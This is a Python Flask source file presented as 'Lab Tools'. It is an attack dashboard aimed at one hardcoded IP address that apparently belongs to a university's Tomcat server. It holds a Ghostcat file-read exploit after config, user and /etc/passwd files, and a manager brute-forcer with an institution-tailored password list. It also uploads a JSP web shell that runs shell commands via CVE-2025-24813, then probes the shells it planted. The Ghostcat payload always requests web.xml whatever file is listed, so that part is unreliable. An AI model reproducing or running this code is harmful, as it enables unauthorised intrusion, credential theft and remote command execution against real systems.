import socket
import urllib.request
import urllib.error
import base64
import struct
from flask import Flask

app = Flask(__name__)

# ─────────────────────────────
# GHOSTCAT ATTACK
# ─────────────────────────────
def ghostcat(host, port=8009):
    results = []
    files = [
        "/WEB-INF/web.xml",
        "/WEB-INF/tomcat-users.xml",
        "/etc/passwd",
        "/WEB-INF/conf/opencms.properties"
    ]
    for f in files:
        try:
            s = socket.socket()
            s.settimeout(20)
            s.connect((host, port))
            payload = bytearray([
                0x12, 0x34, 0x00, 0x1f,
                0x02, 0x02,
                0x00, 0x08,
                0x48, 0x54, 0x54, 0x50,
                0x2f, 0x31, 0x2e, 0x31,
                0x00, 0x00, 0x1b,
                0x2f, 0x57, 0x45, 0x42,
                0x2d, 0x49, 0x4e, 0x46,
                0x2f, 0x77, 0x65, 0x62,
                0x2e, 0x78, 0x6d, 0x6c,
                0x00, 0xff, 0xff,
                0xff, 0xff, 0xff, 0xff,
                0x1f, 0x90, 0x00,
                0x00, 0x00, 0xff
            ])
            s.send(bytes(payload))
            response = b""
            try:
                while True:
                    chunk = s.recv(4096)
                    if not chunk:
                        break
                    response += chunk
            except:
                pass
            if response:
                results.append({
                    "file": f,
                    "status": "SUCCESS",
                    "data": response.decode(errors='ignore')
                })
            else:
                results.append({
                    "file": f,
                    "status": "NO RESPONSE",
                    "data": ""
                })
            s.close()
        except Exception as e:
            results.append({
                "file": f,
                "status": "ERROR",
                "data": str(e)
            })
    return results

# ─────────────────────────────
# BRUTEFORCE ATTACK
# ─────────────────────────────
def bruteforce():
    target = "http://111.68.102.6:8080/manager/html"
    users = ["tomcat","admin","manager",
             "root","administrator"]
    passwords = [
        "tomcat","admin","admin123","password",
        "s3cret","manager","root","uet","uet123",
        "rcet","rcet123","lahore","pakistan",
        "123456","tomcat123","Admin123","changeme",
        "welcome","letmein","default","catalina",
        "java123","tomcat9","engineering","uet2024",
        "uetlahore","UETLahore","uet@lahore",
        "rcetlahore","RCET@2024","rcet@2024",
        "Pakistan1","pakistan@1","Pak@2024",
        "lahore@123","Lahore123","LHR@2024",
        "Tomcat@9","tomcat@9","Tomcat9!",
        "manager@9","Manager@9","Admin@2021",
        "Admin@2024","admin@2021","Server@123",
        "server@123","UET@admin","uet@admin",
        "RCET@admin","uet2021","uet@2021",
        "UET2021","rcet2021","RCET2021",
        "director@uet","Director@123",
        "Tomcat@2021","tomcat@2021",
        "uet@2024","UET@2024","rcet@2021",
        "OpenCms123","opencms123","opencms",
        "OpenCms","cms@admin","CmsAdmin",
    ]
    for user in users:
        for passwd in passwords:
            creds = f"{user}:{passwd}"
            b64 = base64.b64encode(
                creds.encode()
            ).decode()
            req = urllib.request.Request(target)
            req.add_header(
                "Authorization",f"Basic {b64}"
            )
            req.add_header("User-Agent","Mozilla/5.0")
            try:
                res = urllib.request.urlopen(
                    req, timeout=5
                )
                if res.status == 200:
                    return f"✅ FOUND: {user}:{passwd}"
            except urllib.error.HTTPError as e:
                if e.code != 401:
                    pass
            except:
                pass
    return "❌ No credentials found"

# ─────────────────────────────
# CVE-2025-24813 PARTIAL PUT
# ─────────────────────────────
def partial_put_attack(host, port=8080):
    results = []

    # Step 1: Upload partial content via PUT
    # This triggers file write on vulnerable Tomcat
    jsp_shell = b"""<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if(cmd != null){
    Process p = Runtime.getRuntime().exec(
        new String[]{"/bin/sh","-c",cmd}
    );
    InputStream in = p.getInputStream();
    int a = -1;
    byte[] b = new byte[4096];
    out.print("<pre>");
    while((a=in.read(b))!=-1){
        out.print(new String(b,0,a));
    }
    out.print("</pre>");
    in.close();
    p.waitFor();
}
%>
<h2>CVE-2025 Shell Active</h2>
"""

    upload_paths = [
        "/upload.jsp",
        "/shell.jsp",
        "/cmd.jsp",
        "/examples/cmd.jsp",
    ]

    # Try partial PUT (Content-Range header)
    for path in upload_paths:
        try:
            url = f"http://{host}:{port}{path}"
            req = urllib.request.Request(
                url,
                data=jsp_shell,
                method='PUT'
            )
            req.add_header(
                "Content-Type",
                "application/octet-stream"
            )
            req.add_header(
                "Content-Range",
                f"bytes 0-{len(jsp_shell)-1}/{len(jsp_shell)}"
            )
            req.add_header("User-Agent","Mozilla/5.0")
            res = urllib.request.urlopen(
                req, timeout=10
            )
            results.append(
                f"✅ PUT SUCCESS [{res.status}]: {path}"
            )
        except urllib.error.HTTPError as e:
            results.append(
                f"[{e.code}] PUT → {path}"
            )
        except Exception as e:
            results.append(
                f"❌ {str(e)[:60]} → {path}"
            )

    # Step 2: Try incomplete PUT (no Content-Range)
    for path in upload_paths:
        try:
            url = f"http://{host}:{port}{path}"
            req = urllib.request.Request(
                url,
                data=jsp_shell[:100],
                method='PUT'
            )
            req.add_header(
                "Content-Type",
                "application/octet-stream"
            )
            req.add_header(
                "Content-Length",
                str(len(jsp_shell))
            )
            req.add_header("User-Agent","Mozilla/5.0")
            res = urllib.request.urlopen(
                req, timeout=10
            )
            results.append(
                f"✅ PARTIAL PUT [{res.status}]: {path}"
            )
        except urllib.error.HTTPError as e:
            results.append(
                f"[{e.code}] Partial → {path}"
            )
        except Exception as e:
            results.append(
                f"❌ {str(e)[:60]} → {path}"
            )

    return results

def check_shells(host, port=8080):
    paths = [
        "/upload.jsp",
        "/shell.jsp",
        "/cmd.jsp",
        "/examples/cmd.jsp",
    ]
    results = []
    for path in paths:
        try:
            url = f"http://{host}:{port}{path}?cmd=id"
            req = urllib.request.Request(url)
            req.add_header("User-Agent","Mozilla/5.0")
            res = urllib.request.urlopen(
                req, timeout=10
            )
            data = res.read().decode(errors='ignore')
            results.append({
                "path": path,
                "status": "SHELL FOUND",
                "output": data
            })
        except urllib.error.HTTPError as e:
            results.append({
                "path": path,
                "status": f"{e.code}",
                "output": ""
            })
        except Exception as e:
            results.append({
                "path": path,
                "status": "ERROR",
                "output": str(e)[:60]
            })
    return results

# ─────────────────────────────
# ROUTES
# ─────────────────────────────
@app.route('/')
def index():
    return """
    <h1 style='font-family:monospace;
    background:#000;color:#0f0;
    padding:20px'>
    🔥 Lab Tools - 111.68.102.6
    </h1>
    <div style='font-family:monospace;
    font-size:18px;padding:20px'>
    <ul>
        <li><a href='/ghostcat'>
        🕷️ Ghostcat (Read Files)</a></li>
        <li><a href='/brute'>
        🔑 Bruteforce Manager</a></li>
        <li><a href='/cve2025'>
        💀 CVE-2025-24813 Partial PUT</a></li>
        <li><a href='/checkshell'>
        🔍 Check All Shells</a></li>
        <li><a href='/info'>
        🗺️ Server Map</a></li>
    </ul>
    </div>
    """

@app.route('/ghostcat')
def run_ghostcat():
    results = ghostcat("111.68.102.6")
    output = """
    <h1 style='font-family:monospace'>
    Ghostcat - 111.68.102.6:8009</h1>
    """
    for r in results:
        color = "green" if r['status'] == "SUCCESS" \
            else "red"
        output += f"""
        <hr>
        <h3>📄 {r['file']}</h3>
        <p style='color:{color}'>
        Status: {r['status']}</p>
        <pre style='background:#000;
        color:#0f0;padding:10px'>
{r['data'] if r['data'] else 'Empty'}
        </pre>
        """
    return output

@app.route('/brute')
def run_brute():
    result = bruteforce()
    color = "green" if "FOUND" in result else "red"
    return f"""
    <h1 style='font-family:monospace'>
    Bruteforce Results</h1>
    <p style='color:{color};
    font-size:24px;
    font-family:monospace'>{result}</p>
    """

@app.route('/cve2025')
def run_cve2025():
    results = partial_put_attack("111.68.102.6")
    output = """
    <h1 style='font-family:monospace'>
    CVE-2025-24813 Partial PUT Attack</h1>
    <h3>Target: 111.68.102.6:8080</h3>
    """
    for r in results:
        color = "green" if "SUCCESS" in r else "#ff6600" \
            if "204" in r or "201" in r else "red"
        output += f"""
        <p style='font-family:monospace;
        color:{color}'>{r}</p>
        """
    output += """
    <br>
    <a href='/checkshell'>
    🔍 Check If Shell Uploaded</a>
    """
    return output

@app.route('/checkshell')
def run_checkshell():
    results = check_shells("111.68.102.6")
    output = """
    <h1 style='font-family:monospace'>
    Shell Check Results</h1>
    """
    for r in results:
        color = "green" if "SHELL" in r['status'] \
            else "red"
        output += f"""
        <hr>
        <h3 style='color:{color}'>
        {r['path']} → {r['status']}</h3>
        """
        if r['output']:
            output += f"""
            <pre style='background:#000;
            color:#0f0;padding:10px'>
{r['output']}
            </pre>
            """
    return output

@app.route('/info')
def server_info():
    target = "http://111.68.102.6:8080"
    paths = [
        "/", "/home", "/opencms/",
        "/examples/", "/docs/",
        "/manager/html",
        "/host-manager/html",
        "/examples/jsp/snp/snoop.jsp",
        "/examples/servlets/",
        "/examples/websocket/",
    ]
    output = """
    <h1 style='font-family:monospace'>
    Server Map - 111.68.102.6:8080</h1>
    <table border='1' cellpadding='10'
    style='font-family:monospace'>
    <tr><th>Status</th><th>Path</th></tr>
    """
    for path in paths:
        try:
            req = urllib.request.Request(
                target + path,
                headers={"User-Agent":"Mozilla/5.0"}
            )
            res = urllib.request.urlopen(
                req, timeout=5
            )
            output += f"""
            <tr style='background:green;color:white'>
            <td>{res.status} OPEN</td>
            <td>{path}</td></tr>
            """
        except urllib.error.HTTPError as e:
            output += f"""
            <tr style='background:orange'>
            <td>{e.code} FOUND</td>
            <td>{path}</td></tr>
            """
        except Exception as e:
            output += f"""
            <tr style='background:red;color:white'>
            <td>ERROR</td>
            <td>{path}</td></tr>
            """
    output += "</table>"
    return output

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
